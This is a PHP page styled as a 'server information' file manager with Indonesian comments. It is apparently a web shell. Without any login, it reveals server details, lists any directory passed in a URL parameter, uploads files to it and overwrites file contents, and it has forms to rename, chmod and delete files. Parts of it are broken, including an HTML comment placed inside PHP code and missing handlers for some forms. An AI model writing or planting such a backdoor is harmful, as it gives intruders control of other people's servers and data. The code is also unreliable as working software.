<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Informasi Server</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        /* CSS sama seperti sebelumnya */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Arial', sans-serif;
            background-color: #111;
            color: #fff;
            padding: 10px;
        }

        .info-box {
            width: 100%;
            max-width: 400px;
            font-size: 14px;
            margin-bottom: 30px;
        }

        .info-box p {
            margin-bottom: 5px;
        }

        .server, .ip-server, .web-server, .system, .user, .php-version, .dir {
            color: #00ff7f;
        }

        .info-value {
            color: #ffffff;
            text-decoration: none;
            cursor: pointer;
        }

        .info-separator {
            color: #ffffff;
        }

        .upload-section {
            margin-top: 10px;
            text-align: center;
        }

        .upload-box {
            background-color: #8B4513;
            border: 2px dotted #fff;
            padding: 20px;
            border-radius: 10px;
            display: inline-block;
            text-align: center;
            margin-bottom: 20px;
            cursor: pointer;
        }

        .upload-icon {
            font-size: 40px;
            color: white;
            margin-bottom: 10px;
        }

        .upload-text {
            color: white;
            margin-bottom: 20px;
            font-size: 16px;
        }

        input[type="file"] {
            display: none;
        }

        .notification {
            margin-top: -10px;
            padding: 5px;
            border-radius: 5px;
            display: inline-block;
            text-align: center;
            width: 50%;
            font-size: 12px;
        }

        .success {
            background-color: #d4edda;
            color: #155724;
        }

        .error {
            background-color: #f8d7da;
            color: #721c24;
        }

        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
        }

        table, th, td {
            border: 1px solid #fff;
        }

        th, td {
            padding: 10px;
            text-align: left;
        }

        th {
            background-color: #333;
        }

        tr:nth-child(even) {
            background-color: #222;
        }

        .folder {
            font-weight: bold;
            color: white;
        }

        .folder-link {
            color: white;
            text-decoration: none;
        }

        .file-link {
            color: white;
            text-decoration: none;
        }

        .icon-folder {
            color: yellow;
            margin-right: 5px;
        }

        .icon-file {
            color: skyblue;
            margin-right: 5px;
        }

        pre {
            background-color: #222;
            padding: 10px;
            border-radius: 5px;
            white-space: pre-wrap;
            word-wrap: break-word;
        }
        input[type="text"] {
    padding: 10px;
    border-radius: 5px;
    border: 1px solid #ccc;
    width: calc(100% - 22px);
    margin-bottom: 10px;
}

input[type="submit"] {
    padding: 10px 15px;
    border: none;
    border-radius: 5px;
    cursor: pointer;
}

input[type="submit"]:hover {
    opacity: 0.8;
}
    </style>
</head>
<body>
    <!-- Informasi Server -->
    <div class="info-box">
        <p>
            <i class="fas fa-server icon"></i>
            <span class="server">Server</span><span class="info-separator">:</span> <span class="info-value"><?php echo $_SERVER['SERVER_NAME']; ?></span>
        </p>
        <p>
            <i class="fas fa-network-wired icon"></i>
            <span class="ip-server">IP Server</span><span class="info-separator">:</span> <span class="info-value"><?php echo $_SERVER['SERVER_ADDR']; ?></span>
        </p>
        <p>
            <i class="fas fa-globe icon"></i>
            <span class="web-server">Web Server</span><span class="info-separator">:</span> <span class="info-value"><?php echo $_SERVER['SERVER_SOFTWARE']; ?></span>
        </p>
        <p>
            <i class="fas fa-laptop icon"></i>
            <span class="system">System</span><span class="info-separator">:</span> <span class="info-value"><?php echo PHP_OS; ?></span>
        </p>
        <p>
            <i class="fas fa-user icon"></i>
            <span class="user">User</span><span class="info-separator">:</span> <span class="info-value"><?php echo get_current_user(); ?></span>
        </p>
        <p>
            <i class="fas fa-code icon"></i>
            <span class="php-version">PHP Version</span><span class="info-separator">:</span> <span class="info-value"><?php echo phpversion(); ?></span>
        </p>
        <p>
            <i class="fas fa-folder icon"></i>
            <span class="dir">Dir</span><span class="info-separator">:</span> 
            <?php
            $currentDir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
            $dirs = explode('/', trim($currentDir, '/'));
            $baseDir = '';
            foreach ($dirs as $dir) {
                $baseDir .= '/' . $dir;
                echo '<a href="' . $_SERVER['PHP_SELF'] . '?dir=' . urlencode($baseDir) . '" class="info-value info-value-dir">' . htmlspecialchars($dir) . '</a>/';
            }
            ?>
        </p>
    </div>

    <!-- Bagian Unggahan -->
    <div class="upload-section">
        <div class="upload-box" id="upload-box">
            <i class="fas fa-cloud-upload-alt upload-icon"></i>
            <p class="upload-text" id="upload-text">Tap Here For Upload</p>
        </div>
        <form action="" method="POST" enctype="multipart/form-data" id="upload-form">
            <input type="file" name="files[]" id="file-upload" multiple>
        </form>
        
        <!-- Notifikasi -->
        <?php
        if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_FILES['files'])) {
            $targetDir = isset($_GET['dir']) ? $_GET['dir'] : __DIR__;
            $notificationMessage = '';
            $notificationClass = '';

            // Memeriksa izin direktori
            if (!is_writable($targetDir)) {
                $notificationMessage = 'Permissions not writable';
                $notificationClass = 'error';
            } else {
                $uploadSuccess = true;
                foreach ($_FILES['files']['name'] as $index => $fileName) {
                    $targetFilePath = $targetDir . '/' . basename($fileName);
                    if (!move_uploaded_file($_FILES['files']['tmp_name'][$index], $targetFilePath)) {
                        $notificationMessage = 'Failed to upload: ' . htmlspecialchars($fileName);
                        $notificationClass = 'error';
                        $uploadSuccess = false;
                        break;
                    }
                }
                if ($uploadSuccess) {
                    $notificationMessage = 'Successfully uploaded';
                    $notificationClass = 'success';
                }
            }
            // Tampilkan notifikasi
            if ($notificationMessage) {
                echo '<div class="notification ' . $notificationClass . '">' . $notificationMessage . '</div>';
            }
        }
        ?>
    </div>

    <!-- Tabel File Manager -->
    <div class="file-manager">
        <?php
        $targetDir = isset($_GET['dir']) ? $_GET['dir'] : __DIR__;
        $files = scandir($targetDir);
        $folders = [];
        $filesList = [];

        // Memisahkan folder dan file
        foreach ($files as $file) {
            if ($file != '.' && $file != '..') {
                if (is_dir($targetDir . '/' . $file)) {
                    $folders[] = $file;
                } else {
                    $filesList[] = $file;
                }
            }
        }

        <!-- Menampilkan konten file jika parameter file ada -->
if (isset($_GET['file'])) {
    $filePath = $targetDir . '/' . $_GET['file'];
    if (file_exists($filePath) && is_readable($filePath)) {
        if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['content'])) {
            file_put_contents($filePath, $_POST['content']);
            echo '<div class="notification success">File updated successfully.</div>';
        }
        echo '<h3>Edit File: ' . htmlspecialchars($_GET['file']) . '</h3>';
        echo '<form method="POST"><textarea name="content" rows="10" cols="50" style="width: 100%;"></textarea><br>';
        echo '<input type="submit" value="Save Changes" style="background-color: #28a745; color: white; padding: 10px; border: none; border-radius: 5px; cursor: pointer;"></form>';
        
        // Rename
        echo '<h4>Rename File</h4>';
        echo '<form method="POST" action="" style="margin-bottom: 20px;">';
        echo '<input type="text" name="new_name" placeholder="New file name" required style="width: calc(100% - 10px); padding: 5px; border-radius: 5px; border: 1px solid #ccc;">';
        echo '<input type="hidden" name="old_name" value="' . htmlspecialchars($_GET['file']) . '">';
        echo '<input type="submit" value="Rename" style="background-color: #007bff; color: white; padding: 10px; border: none; border-radius: 5px; cursor: pointer;">';
        echo '</form>';

        // Change Permissions
        echo '<h4>Change Permissions</h4>';
        echo '<form method="POST" action="" style="margin-bottom: 20px;">';
        echo '<input type="text" name="permissions" placeholder="New permissions (e.g., 755)" required style="width: calc(100% - 10px); padding: 5px; border-radius: 5px; border: 1px solid #ccc;">';
        echo '<input type="hidden" name="file_path" value="' . htmlspecialchars($filePath) . '">';
        echo '<input type="submit" value="Change Permissions" style="background-color: #ffc107; color: white; padding: 10px; border: none; border-radius: 5px; cursor: pointer;">';
        echo '</form>';

        // Delete File
        echo '<h4>Delete File</h4>';
        echo '<form method="POST" action="">';
        echo '<input type="hidden" name="delete_file" value="' . htmlspecialchars($_GET['file']) . '">';
        echo '<input type="submit" value="Delete" style="background-color: #dc3545; color: white; padding: 10px; border: none; border-radius: 5px; cursor: pointer;" onclick="return confirm(\'Are you sure you want to delete this file?\');">';
        echo '</form>';
    } else {
        echo '<p class="error">File tidak dapat dibaca.</p>';
    }            
        } else {
            // Menampilkan folder
            echo '<h2>File Manager</h2>';
            echo '<table>';
            echo '<thead><tr><th>Folder/File</th></tr></thead><tbody>';
            foreach ($folders as $folder) {
                echo '<tr><td class="folder"><a href="?dir=' . urlencode($targetDir . '/' . $folder) . '" class="folder-link"><i class="fas fa-folder icon-folder"></i>' . htmlspecialchars($folder) . '</a></td></tr>';
            }

            // Menampilkan file
            foreach ($filesList as $file) {
                echo '<tr><td class="file"><a href="?dir=' . urlencode($targetDir) . '&file=' . urlencode($file) . '" class="file-link"><i class="fas fa-file icon-file"></i>' . htmlspecialchars($file) . '</a></td></tr>';
            }
            echo '</tbody></table>';
        }
        ?>
    </div>

    <script>
    const fileUpload = document.getElementById('file-upload');
    const uploadForm = document.getElementById('upload-form');
    const uploadBox = document.getElementById('upload-box');

    uploadBox.addEventListener('click', function() {
        fileUpload.click();
    });

    fileUpload.addEventListener('change', function() {
        if (this.files.length > 0) {
            uploadForm.submit();
        }
    });
    </script>
</body>
</html>
